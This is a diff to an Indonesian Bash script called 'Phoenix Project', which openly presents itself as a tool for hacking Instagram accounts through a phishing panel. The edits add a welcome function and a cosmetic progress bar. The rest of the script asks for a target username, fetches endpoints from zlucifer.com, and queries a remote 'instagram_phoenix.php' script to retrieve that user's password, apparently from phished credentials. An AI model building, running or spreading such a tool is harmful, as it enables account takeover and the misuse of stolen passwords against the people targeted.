@@ -10,6 +10,7 @@
 #////                                                                       ////
 #///////////////////////////////////////////////////////////////////////////////
 #///////////////////////////////////////////////////////////////////////////////
+intro(){
 echo "Selamat datang kak, Siapa nick kaka?" #tulisan keluar
 read nick #membaca yang ditulis
 echo "                         ______ "
@@ -47,11 +48,32 @@ sleep 0.7
 echo "================================"
 echo " Phoenix Project adalah tools untuk"
 echo " Hacking Instagram via Phising Panel"
+echo
+echo "Selamat datang "$nick
+}
+load(){
+    echo -e "\n"
+    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
+    barlength=${#bar}
+    i=0
+    while((i<100)); do
+        n=$((i*barlength / 100))
+        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
+        ((i += RANDOM%5+2))
+        sleep 0.2
+    done
+}
 get_url=$(curl -s http://zlucifer.com/api/phoenix_api_1.php)
 get_url2=$(curl -s http://zlucifer.com/api/phoenix_api_2.php)
 cek='curl -s '$get_url2 # check status
 zlucifer="user-agent: zlucifer"
-response=`curl -H "$zlucifer" -s -o /dev/null -w "%{http_code}" $cek`
+clear
+echo Mohon tunggu..
+load
+clear
+intro
+response=`curl -H "$zlucifer" -m "60" -s -o /dev/null -w "%{http_code}" $cek`
+
 #echo $response
 if [[ $response != *302* ]]; then
     echo
@@ -78,13 +100,9 @@ else
         echo
         if [ $confirm = "y" ]; then
                 echo Melakukan pencarian password username : $target
-                i=0
-                   max=100
-                while [ $i -le $max ]; do
-                echo -ne "\nScanning percentage : $i% "
-                sleep 0.03
-                if [ $i -eq 100 ]; then
-                    echo -ne " [complete!]\n"
+                load
+            echo
+            echo
                     echo "Jangan close aplikasi sebelum scan selesai"            
                     echo "========================================"
                 cek_target=`curl -s $get_url/instagram_phoenix.php?cari=$target`
@@ -93,9 +111,6 @@ else
                     echo " Gunakan tools dengan bijak"
                     echo " -zLucifer"
                     echo "======================================="
-                    fi
-                    let i++
-                    done
             else
                     echo "Kesalahan"
             fi            
